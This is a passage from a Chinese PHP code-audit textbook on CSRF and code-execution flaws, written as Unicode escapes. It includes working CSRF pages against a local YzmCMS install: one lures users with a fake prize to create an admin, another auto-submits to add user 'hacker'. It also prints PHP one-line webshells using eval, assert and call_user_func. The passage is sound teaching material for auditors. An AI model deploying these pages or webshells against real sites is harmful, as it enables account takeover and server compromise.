\u5176\u4E2D\u53C2\u6570\u53EF\u53C2\u8003CMS\u4E2D\u589E\u52A0\u7BA1\u7406\u5458\u7684FORM\u8868\u5355\u3002\u7528\u6237\u540D\u4E3Atest_123\uFF0C\u5BC6\u7801\u4E3A123456\u3002\u9875\u9762\u540D\u79F0\u4E3Acsrf.html\u4E14\u5185\u5BB9\u5982\u4E0B\uFF1A\r
\r
\r
\r
<!DOCTYPE html><html lang="en">\r
\r
<head>\r
\r
    <meta charset="utf-8">\r
\r
  <title>\u606D\u559C\u4F60\u4E2D\u5956\u5566</title>\r
\r
</head>\r
\r
\u3000\u3000<body><img src="zj.jpg"/>\r
\r
  <FORM action="**http://127.0.0.1/admin/admin_users.php?act=add_users_save**" method="**POST**" id="transfer" name="transfer">\r
\r
\u3000\u3000\u3000 <input type="hidden" name="**admin_name**" value="test_123">\r
\r
\u3000\u3000\u3000\u3000<input type="hidden" name="**email**" value="test@test.com">\r
\r
\u3000\u3000\u3000\u3000<input type="hidden" name="**password**" value="123456">\r
\r
\u3000\u3000\u3000\u3000<input type="hidden" name="**password1**" value="123456">\r
\r
\u3000\u3000\u3000\u3000<input type="hidden" name="**rank**" value="1">\r
\r
\u3000\u3000\u3000\u3000<input type="hidden" name="**submit3**" value=%CC%ED%BC%D3>\r
\r
\u200B    <button type="submit" value="Submit">\u8FDB\u5165\u9886\u53D6\u5927\u5956\uFF01</button></FORM>\r
\r
\u3000\u3000</body></html>\r
\r
\r
\r
\u5C06\u4E0A\u8FF0\u9875\u9762csrf.html\u5B58\u653E\u4E8E\u7F51\u7AD9\u7684\u6839\u8DEF\u5F84C:/PhpStudy/PHPTutorial/WWW\u4E0B\uFF0C\u7136\u540E\u5728\u4E0D\u66F4\u6362\u6D4F\u89C8\u5668\u7684\u60C5\u51B5\u4E0B\uFF0C\u8BBF\u95EE\u4E0A\u8FF0HTML\u9875\u9762\uFF0C\u5982\u56FE5-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image308.jpg)\r
\r
\u56FE5-8 CSRF\u9677\u9631\u9875\u9762\r
\r
\u5982\u679C\u76EE\u6807\u70B9\u51FB\u201C\u8FDB\u5165\u9886\u53D6\u5927\u5956\u201D\u6309\u94AE\uFF0C\u7136\u540E\u8FD4\u56DE\u540E\u53F0\u7BA1\u7406\u5458\u754C\u9762\uFF0C\u53D1\u73B0\u6B64\u65F6\u7CFB\u7EDF\u88AB\u6DFB\u52A0\u4E86\u4E00\u4E2A\u7528\u6237\u540D\u4E3Atest_123\uFF0C\u5BC6\u7801\u4E3A123456\u7684\u7BA1\u7406\u5458\u7528\u6237\uFF0C\u5982\u56FE5-9\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image310.jpg)\r
\r
\u56FE5-9 \u6DFB\u52A0\u7528\u6237\u9875\u9762\r
\r
### 5.4.2  \u5B9E\u9A8C\uFF1AYzmCMS5.8 CSRF\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9YzmCMS5.8\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u4F1A\u5458\u7BA1\u7406\u4E2D\u7684\u7528\u6237\u6DFB\u52A0\u6A21\u5757\u662F\u5426\u5B58\u5728CSRF\u6F0F\u6D1E\uFF0C\u901A\u8FC7CSRF\u6F0F\u6D1E\u6784\u9020\u653B\u51FBPOC\uFF0C\u5728\u7BA1\u7406\u5458\u767B\u5F55\u72B6\u6001\u4E0B\u89E6\u53D1\u6076\u610F\u4EE3\u7801\u6DFB\u52A0\u7528\u6237hacker\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
1\uFF09\u53C2\u80035.2.2\u8282\uFF1APOST\u578BCSRF\u6F0F\u6D1E\uFF1B5.3.1\u8282\uFF1A\u9A8C\u8BC1HTTP Referer\u5B57\u6BB5\u3002\r
\r
2\uFF09YzmCMS\u7684\u6574\u4F53\u67B6\u6784\r
\r
\u76EE\u5F55yzmcms/application\u4E2D\u5305\u62EC\u6A21\u5757\u540D\u4E3A\uFF1Aadmin\u3001adver\u3001banner\u7B49\uFF0C\u5176\u5BF9\u5E94\u7740\u8BE5CMS\u4E2D\u4E0D\u540C\u7684\u6A21\u5757\u5E94\u7528\u4EE3\u7801\uFF0C\u4F8B\u5982\uFF1Aadmin\u6A21\u5757\u5219\u5BF9\u5E94\u8BE5CMS\u7684\u7BA1\u7406\u5458\u6A21\u5757\u3002\r
\r
\u4EE5admin\u6A21\u5757\u4E3A\u4F8B\uFF0Cadmin\u76EE\u5F55\u5305\u542B\u4EE5\u4E0B\u6587\u4EF6\u5939\uFF1A\r
\r
l Common\uFF1A\u8BE5\u76EE\u5F55\u4E0B\u5305\u542Badmin\u6A21\u5757\u4F7F\u7528\u7684\u516C\u7528\u51FD\u6570\uFF0C\u65B9\u4FBF\u7EDF\u4E00\u7BA1\u7406\u53CA\u8C03\u7528\uFF0C\u4F8B\u5982\uFF1A\u6570\u636E\u5E93\u8FDE\u63A5\u64CD\u4F5C\u6587\u4EF6\u7B49\u3002\r
\r
l View\uFF1A\u8BE5\u76EE\u5F55\u4E0B\u5305\u542Badmin\u6A21\u5757\u4F7F\u7528\u7684\u524D\u53F0html\u9875\u9762\uFF1B\r
\r
l Model\uFF1A\u8BE5\u76EE\u5F55\u4E0B\u5305\u542Badmin\u6A21\u5757\u4F7F\u7528\u7684\u5BF9\u8C61\u53CA\u5176\u521D\u59CB\u5316\u8FC7\u7A0B\uFF0C\u4F8B\u5982\uFF1A\u7BA1\u7406\u5458\u5BF9\u8C61\u7684\u5B9A\u4E49\u53CA\u521D\u59CB\u5316\uFF1B\r
\r
l Controller\uFF1A\u8BE5\u76EE\u5F55\u4E0B\u5305\u542Badmin\u6A21\u5757\u7684\u4E1A\u52A1\u903B\u8F91\u540E\u53F0php\u4EE3\u7801\uFF0C\u4F8B\u5982\uFF1A\u4F1A\u5458\u7BA1\u7406\u529F\u80FD\u903B\u8F91\u7B49\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1CSRF\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BYzmCMS5.8\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
\xD8 \u767B\u5F55\u72B6\u6001\u5BA1\u8BA1\r
\r
\u5BA1\u8BA1\u7BA1\u7406\u5458\u7C7B\u6587\u4EF6application\\admin\\controller\\common.class.php\uFF0C\u4EE3\u7801\u5982\u56FE5-10\u6240\u793A\u3002__construct\u4E3ACommon\u7C7B\u7684\u6784\u9020\u51FD\u6570\uFF0C\u5176\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u8C03\u7528check_admin\u51FD\u6570\u67E5\u770B\u7BA1\u7406\u5458\u662F\u5426\u5DF2\u7ECF\u767B\u5F55\uFF1B\r
\r
l \u8C03\u7528check_priv\u51FD\u6570\u68C0\u67E5\u5F53\u524D\u7528\u6237\u7684\u6743\u9650\u5224\u5B9A\uFF1B\r
\r
l \u8C03\u7528check_ip\u51FD\u6570\u68C0\u67E5\u540E\u53F0IP\u5730\u5740\u7981\u6B62\u5224\u65AD\u64CD\u4F5C\u3002\r
\r
\u68C0\u67E5\u7528\u6237\u767B\u5F55\u72B6\u6001\u4F7F\u7528check_admin\u51FD\u6570\uFF0C\u7531\u4E8ECSRF\u6F0F\u6D1E\u8981\u6C42\u7528\u6237\u5904\u4E8E\u767B\u5F55\u72B6\u6001\uFF0C\u7ED5\u8FC7\u8BE5\u51FD\u6570\u662F\u5229\u7528CSRF\u6F0F\u6D1E\u7684\u6761\u4EF6\u4E4B\u4E00\uFF0C\u56E0\u6B64\u5BA1\u8BA1\u51FD\u6570check_admin\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image312.jpg)\r
\r
\u56FE5-10 common\u7C7B\u6784\u9020\u51FD\u6570\r
\r
check_admin\u51FD\u6570\u7528\u4E8E\u68C0\u67E5\u7528\u6237\u662F\u5426\u5904\u4E8E\u767B\u5F55\u72B6\u6001\uFF0C\u8BE5\u51FD\u6570\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u5224\u65AD\u8BE5\u51FD\u6570\u7684\u8C03\u7528\u662F\u5426\u4ECEadmin/index/login\u8BF7\u6C42\u800C\u6765\uFF0C\u82E5\u662F\u5219\u8FD4\u56DEtrue\uFF1B\r
\r
l \u5426\u5219\uFF0C\u68C0\u67E5Session\u4E2Dadminid\u548Croleid\u5B57\u6BB5\u4E0E\u503C\u662F\u5426\u5B58\u5728\uFF0C\u82E5\u4E0D\u5B58\u5728\u5219\u9875\u9762\u8DF3\u8F6C\u5230admin/index/login\u91CD\u65B0\u767B\u5F55\u3002\r
\r
l \u82E5Session\u4E2Dadminid\u548Croleid\u5B57\u6BB5\u4E0E\u503C\u90FD\u5B58\u5728\uFF0C\u5219\u8C03\u7528check_referer\u51FD\u6570\u3002\u8BE5\u51FD\u6570\u7528\u4E8E\u67E5\u770BHTTP\u8BF7\u6C42\u4E2D\u7684referer\u60C5\u51B5\uFF0C\u9700\u5BA1\u8BA1check_referer\u51FD\u6570\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image314.jpg)\r
\r
\u56FE5-11 check_admin\u51FD\u6570\r
\r
check_referer\u51FD\u6570\u53EA\u5224\u65ADHTTP_REFERER\u5B58\u5728\u4E14\u5176\u503C\u4E0E\u4E3B\u673A\u540D\u4E0D\u540C\u65F6\u624D\u62D2\u7EDD\u8BBF\u95EE\uFF0C\u8FD9\u6BB5\u4EE3\u7801\u660E\u663E\u5B58\u5728\u903B\u8F91\u6F0F\u6D1E\u3002\u5982\u679C\u53D1\u9001\u7684HTTP\u8BF7\u6C42\u4E2DHTTP_REFERER\u4E0D\u5B58\u5728\uFF0C\u8BE5\u51FD\u6570\u6700\u7EC8\u4E5F\u8FD4\u56DEtrue\u3002\u56E0\u6B64\uFF0C\u6784\u9020\u7684Payload\u53EF\u4EE5\u4E0D\u5305\u62ECReferer\u5B57\u6BB5\u6216Referer\u5B57\u6BB5\u4E3A\u4E3B\u673A\u540D\uFF0C\u4ECE\u800C\u5B8C\u6210CSRF\u6F0F\u6D1E\u7684\u5229\u7528\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image316.jpg)\r
\r
\u56FE5-12 check_referer\u51FD\u6570\r
\r
\xD8 \u6DFB\u52A0\u7528\u6237\u529F\u80FD\u7684CSRF\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\u672C\u5B9E\u9A8C\u4EE5\u7528\u6237\u6DFB\u52A0\u529F\u80FD\u6A21\u5757\u4E3A\u4F8B\uFF0C\u5BA1\u8BA1\u8BE5\u6A21\u5757\u529F\u80FD\u662F\u5426\u5B58\u5728Token\u6821\u9A8C\uFF0C\u4ECE\u800C\u786E\u5B9A\u8BE5\u7F51\u7AD9\u662F\u5426\u5B58\u5728CSRF\u6F0F\u6D1E\u3002\r
\r
\u9996\u5148\u67E5\u770B\u7528\u6237\u6DFB\u52A0\u524D\u53F0\u9875\u9762yzmcms\\application\\member\\**view**\\member_add.html\u3002\u8BE5\u9875\u9762\u4EE3\u7801\u4E2DFORM\u8868\u5355\u5C06\u89E6\u53D1dosub\u51FD\u6570\u3002\u9700\u8981\u5BF9\u5BA1\u8BA1dosub\u51FD\u6570\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u5982\u56FE5-13\u6240\u793A\uFF0C\u8BE5\u51FD\u6570\u8C03\u7528U\u51FD\u6570\u6267\u884C\u540E\u53F0member\\controller\\member.class.php\u7684add\u65B9\u6CD5\u6DFB\u52A0\u7528\u6237\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image318.jpg)\r
\r
\u56FE5-13 dosub\u51FD\u6570\u4EE3\u7801\r
\r
\u5BA1\u8BA1member.class.php\u4E2D\u7684add\u65B9\u6CD5\u7528\u6765\u6DFB\u52A0\u7528\u6237\uFF0C\u8BE5\u51FD\u6570\u65B9\u6CD5\u5E76\u672A\u5BF9\u7528\u6237\u7684token\u8FDB\u884C\u68C0\u9A8C\u3002\u81F3\u6B64YzmCMS\u7CFB\u7EDF\u7684\u7528\u6237\u6DFB\u52A0\u529F\u80FD\u65E0token\u6821\u9A8C\uFF0C\u4E14Referer\u6821\u9A8C\u5B58\u5728\u6F0F\u6D1E\uFF0C\u53EF\u5C1D\u8BD5\u5229\u7528\u8BE5\u6A21\u5757\u7684CSRF\u6F0F\u6D1E\u6DFB\u52A0\u7528\u6237\uFF0C\u5206\u6790\u6D41\u7A0B\u56FE5-14\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image320.jpg)\r
\r
\u56FE5-14 \u5206\u6790\u6D41\u7A0B\u56FE\r
\r
\uFF082\uFF09  \u6D4B\u8BD5\u5229\u7528\u9636\u6BB5\r
\r
\u5236\u4F5C\u7528\u6237\u70B9\u51FB\u7684\u6076\u610F\u7F51\u7AD9\u9875\u9762\uFF0C\u8BE5\u7F51\u9875\u7528\u4E8E\u63D0\u4EA4\u589E\u52A0\u7528\u6237\u529F\u80FD\uFF0C\u8BBE\u8BA1\u7684HTML\u9875\u9762\u4E3A\u589E\u52A0\u7528\u6237\u7684FORM\u8868\u5355\uFF0C\u63D0\u4EA4HTTP\u7684POST\u8BF7\u6C42\uFF0C\u4E14\u8BF7\u6C42\u8DEF\u5F84\u4E3A\uFF1Ahttp://127.0.0.1/yzmcms/member/member/add.html\u3002\u7528\u6237\u540D\u4E3Ahacker\uFF0C\u5BC6\u7801\u4E3Ahacker\u3002\u9875\u9762\u540D\u79F0\u4E3Acsrf2.html\u4E14\u5185\u5BB9\u5982\u4E0B\uFF1A\r
\r
\r
\r
<!DOCTYPE html><html lang="en">\r
\r
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">\r
\r
<meta name="referrer" content="never">\r
\r
<title>Document</title></head><body>\r
\r
<FORM action="**http://127.0.0.1/yzmcms/member/member/add.html**" method="post">\r
\r
<input type="hidden" name="username" value="hacker">\r
\r
<input type="hidden" name="password" value="hacker">\r
\r
<input type="hidden" name="nickname" value="hacker">\r
\r
<input type="hidden" name="email" value="hacker@hacker.com">\r
\r
<input type="hidden" name="groupid" value="1">\r
\r
<input type="hidden" name="point" value="0">\r
\r
<input type="hidden" name="overduedate" value="">\r
\r
<input type="hidden" name="dosubmit" value="1"></FORM>\r
\r
<script>\r
\r
**let oFORM = document.querySelector('FORM');**\r
\r
**oFORM.submit();**\r
\r
<\/script>\r
\r
</body></html>\r
\r
\r
\r
  \u5C06\u4E0A\u8FF0\u9875\u9762csrf2.html\u5B58\u653E\u4E8E\u7F51\u7AD9\u7684\u6839\u8DEF\u5F84C:/PhpStudy/PHPTutorial/WWW\u4E0B\uFF0C\u7136\u540E\u5728\u4E0D\u66F4\u6362\u6D4F\u89C8\u5668\u4E14\u7BA1\u7406\u5458\u5904\u4E8E\u767B\u5F55\u60C5\u51B5\u4E0B\uFF0C\u8BBF\u95EE\u4E0A\u8FF0HTML\u9875\u9762\u8DEF\u5F84\u4E3Ahttp://127.0.0.1/scrf2.html\uFF0C\u89E6\u53D1\u6DFB\u52A0\u7528\u6237\uFF0C\u663E\u793A\u5982\u56FE5-15\u7ED3\u679C\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image322.jpg)\r
\r
\u56FE5-15 \u6DFB\u52A0\u7528\u6237\u7ED3\u679C1\r
\r
\u7BA1\u7406\u5458\u91CD\u65B0\u5237\u65B0\u9875\u9762\uFF0C\u67E5\u770B\u4F1A\u5458\u5217\u8868\uFF0C\u53D1\u73B0\u5DF2\u7ECF\u6DFB\u52A0\u7528\u6237hacker\uFF0C\u5982\u56FE5-16\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image324.jpg)\r
\r
\u56FE5-16 \u6DFB\u52A0\u7528\u6237\u7ED3\u679C2\r
\r
## 5.5 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u4E3B\u8981\u5B66\u4E60\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684CSRF\u6F0F\u6D1E\uFF0C\u901A\u8FC7\u5BF9GET\u578B\u548CPOST\u578B\u6F0F\u6D1E\u4ECB\u7ECD\uFF0C\u4F7F\u8BFB\u8005\u719F\u6089\u5BA1\u8BA1CSRF\u6F0F\u6D1E\u7684\u65B9\u6CD5\u3002\u672C\u5355\u5143\u8981\u6C42\u8BFB\u8005\u7740\u91CD\u638C\u63E1\u5404\u7C7BCSRF\u6CE8\u5165\u6F0F\u6D1E\u7684PHP\u4EE3\u7801\u5F62\u5F0F\uFF0C\u5E76\u901A\u8FC7\u5BF9\u5C0F\u578BCMS\u7684\u4EE3\u7801\u8D70\u8BFB\u5BA1\u8BA1\u4EE3\u7801\u4E2D\u5B58\u5728\u7684CSRF\u6F0F\u6D1E\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u51436 \u4EE3\u7801\u6267\u884C\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\u672C\u5355\u5143\u4ECB\u7ECD\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u56DB\u4E2A\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4ECB\u7ECD\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u57FA\u7840\u77E5\u8BC6\uFF0C\u5305\u62EC\uFF1A\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570\u7684\u4EE3\u7801\u5206\u6790\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECB\u7ECD\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\u4F7F\u7528\u5168\u5C40\u641C\u7D22\u529F\u80FD\u5BF9\u9AD8\u5371\u51FD\u6570\u7684\u4F20\u53C2\u8FDB\u884C\u5206\u6790\uFF0C\u5E76\u5BF9\u4F20\u53C2\u4F7F\u7528\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u5206\u6790\u4F20\u53C2\u8FC7\u7A0B\u53CA\u51FD\u6570\u8C03\u7528\u6808\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECD\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u5E38\u89C1\u9632\u5FA1\u673A\u5236\u3002\r
\r
\u7B2C\u56DB\u90E8\u5206\u4F7F\u7528YCCMS3.3\u3001YzmCMS3.6\u3001Discuz1.5\u8FDB\u884C\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u8FDB\u884C\u5BA1\u8BA1\u5B9E\u8DF5\u3002\r
\r
**\u5355\u5143\u6982\u8FF0\uFF1A**\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image326.jpg)\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1.  \u719F\u6089\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u5E38\u89C1\u9AD8\u5371\u51FD\u6570\uFF1B\r
\r
\\2.  \u4E86\u89E3\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u6316\u6398\u6280\u5DE7\uFF1B\r
\r
\\3.  \u638C\u63E1\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u5E38\u89C1\u4EE3\u7801\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
\\4.  \u638C\u63E1\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u9632\u5FA1\u65B9\u6CD5\u3002\r
\r
## 6.1 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u6316\u6398\r
\r
### 6.1.1 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u7B80\u4ECB\r
\r
  \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u662F\u6307\u5E94\u7528\u7A0B\u5E8F\u672C\u8EAB\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u7528\u6237\u53EF\u4EE5\u901A\u8FC7HTTP\u8BF7\u6C42\u5C06\u4EE3\u7801\u6CE8\u5165\u5230\u5E94\u7528\u4E2D\u5E76\u6267\u884C\u6076\u610F\u64CD\u4F5C\uFF0C\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u53EF\u5BFC\u81F4\u653B\u51FB\u8005\u5C06\u4EE3\u7801\u6CE8\u5165\u5230\u5E94\u7528\u4E2D\u6700\u7EC8\u5728Web\u670D\u52A1\u5668\u6267\u884C\u3002\u8FD9\u6837\u7684\u6F0F\u6D1E\u5982\u679C\u672A\u5BF9\u4F20\u53C2\u8FDB\u884C\u4E25\u683C\u8FC7\u6EE4\uFF0C\u5219\u76F8\u5F53\u4E8E\u4E00\u4E2AWeb\u540E\u95E8\uFF0C\u5E38\u89C1\u7684\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u7684PHP\u51FD\u6570\u5305\u62EC\uFF1Aeval()\u3001assert()\u3001preg_replace()\u3001call_user_func()\u3001call_user_func_array()\u3001array_map()\u3001create_function()\u7B49\u3002\u9664\u6B64\u4E4B\u5916\uFF0CPHP\u7684\u52A8\u6001\u51FD\u6570\u4E5F\u662F\u76EE\u524D\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u53D1\u751F\u8F83\u591A\u7684\u4F4D\u7F6E\u3002\r
\r
### 6.1.2 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570\r
\r
\u672C\u5C0F\u8282\u5C06\u5BF9\u5E38\u89C1\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u51FD\u6570\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\uFF081\uFF09  eval\u51FD\u6570\r
\r
\u8BE5\u51FD\u6570\u5C06\u5B57\u7B26\u4E32\u4F5C\u4E3APHP\u4EE3\u7801\u6267\u884C\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php @eval($_GET[a])?>\r
\r
\r
\r
  \u4E0A\u8FF0\u4EE3\u7801\u4E3A\u5E38\u89C1\u4E00\u53E5\u8BDD\u6728\u9A6C\uFF0C\u901A\u8FC7HTTP\u7684GET\u65B9\u5F0F\u4F20\u53C2\uFF0C\u5C06\u4F20\u53C2\u4EE5PHP\u547D\u4EE4\u6267\u884C\uFF0C\u53D1\u9001HTTP\u8BF7\u6C42\u8DEF\u5F84\uFF1Ahttp://ip/commond-labs/eval.php?a=phpinfo();\u4EE3\u7801\u6267\u884C\u7ED3\u679C\u5982\u4E0B\u56FE6-1\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image328.gif)\r
\r
\u56FE6-1 eval\u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
\uFF082\uFF09  assert\u51FD\u6570\r
\r
assert\u51FD\u6570\u7684\u7528\u6CD5\uFF1A\r
\r
bool assert(mixed $assertion [,Throwable $exception])\r
\r
\u8BE5\u51FD\u6570\u4F1A\u68C0\u67E5\u5176\u4F20\u53C2assertion\uFF0C\u5982\u679Cassertion\u662F\u5B57\u7B26\u4E32\uFF0C\u5B83\u4F1A\u88ABassert\u51FD\u6570\u5F53\u4F5CPHP\u4EE3\u7801\u6267\u884C\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php @assert($_GET[a])?>\r
\r
\r
\r
  \u4E0A\u8FF0\u4EE3\u7801\u4E3A\u4E00\u53E5\u8BDD\u6728\u9A6C\u53D8\u5F62\uFF0C\u901A\u8FC7HTTP\u7684GET\u65B9\u5F0F\u4F20\u53C2\uFF0C\u5C06\u4F20\u53C2\u4EE5PHP\u547D\u4EE4\u6267\u884C\uFF0C\u53D1\u9001HTTP\u8BF7\u6C42\u8DEF\u5F84\uFF1Ahttp://ip/commond-labs/assert.php?a=phpinfo();\u6267\u884C\u7ED3\u679C\u5982\u56FE6-2\u6240\u793A\u3002\u503C\u5F97\u6CE8\u610F\u7684\u662F\u5728PHP7.0.29\u4EE5\u540E\uFF0Cassert\u51FD\u6570\u5C06\u4E0D\u518D\u652F\u6301\u52A8\u6001\u8C03\u7528\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image330.gif)\r
\r
\u56FE6-2 assert\u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
\uFF083\uFF09  call_user_func\u51FD\u6570\r
\r
call_user_func\u51FD\u6570\u5C06\u7B2C\u4E00\u4E2A\u53C2\u6570\u4F5C\u4E3A\u56DE\u8C03\u51FD\u6570\u8FDB\u884C\u8C03\u7528\uFF0C\u5176\u4F59\u53C2\u6570\u4F5C\u4E3A\u56DE\u8C03\u51FD\u6570\u7684\u53C2\u6570\u8FDB\u884C\u4F20\u53C2\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php call_user_func($_GET['fun'],$_GET['arg']);?>\r
\r
\r
\r
  \u4E0A\u8FF0\u4EE3\u7801\u4E3A\u4E00\u53E5\u8BDD\u6728\u9A6C\u53D8\u5F62\uFF0C\u901A\u8FC7HTTP\u7684GET\u65B9\u5F0F\u4F20\u9012\u4E24\u4E2A\u53C2\u6570\uFF0C\u5206\u522B\u662F\u51FD\u6570\u540Dsystem\u53CA\u4F20\u9012\u53C2\u6570whoami\u3002\u8FD9\u6837\u5C06\u6267\u884Cphp\u4EE3\u7801system(\u2018whoami\u2019);\uFF0C\u6267\u884C\u6548\u679C\u5982\u56FE6-3\u6240\u793A\uFF0C\u5176\u6253\u5370\u4E86\u5F53\u524D\u4E3B\u673A\u540D\u79F0\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image332.jpg)\r
\r
\u56FE6-3 call_user_func\u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
\uFF084\uFF09  call_user_func_array\u51FD\u6570\r
\r
call_user_func_array\u51FD\u6570\u5C06\u7B2C\u4E00\u4E2A\u53C2\u6570\u4F5C\u4E3A\u56DE\u8C03\u51FD\u6570\u8FDB\u884C\u8C03\u7528\uFF0C\u628A\u53C2\u6570\u6570\u7EC4\u4F5C\u4E3A\u56DE\u8C03\u51FD\u6570\u7684\u53C2\u6570\u4F20\u5165\u3002\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$array[0] = $_GET['arg'];\r
\r
call_user_func_array($_GET['fun'],$array);?>\r
\r
\r
\r
  \u4E0E\u4E0A\u8FF0call_user_func\u51FD\u6570\u7C7B\u4F3C\uFF0C\u552F\u4E00\u4E0D\u540C\u7684\u662Fcall_user_func_array\u51FD\u6570\u9700\u4F20\u9012\u6570\u7EC4\uFF0C\u800C\u4E0D\u662F\u5B57\u7B26\u4E32\u3002\u4E0B\u56FE\u4E3A\u4F7F\u7528system\u51FD\u6570\u53C2\u6570\u4E3Awhoami\uFF0C\u67E5\u770B\u5F53\u524D\u7528\u6237\u4FE1\u606F\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image334.jpg)\r
\r
\u56FE6-4 call_user_func_array\u4EE3\u7801\u6267\u884C\u7ED3\u679C\r
\r
\uFF085\uFF09  create_function\u51FD\u6570\r
\r
create_function\u51FD\u6570\u6839\u636E\u4F20\u9012\u53C2\u6570\u521B\u5EFA\u533F\u540D\u51FD\u6570\uFF0C\u5E76\u4E3A\u533F\u540D\u51FD\u6570\u8FD4\u56DE\u552F\u4E00\u540D\u79F0\u3002\u8BE5\u51FD\u6570\u7528\u6CD5\u5982\u4E0B:\r
\r
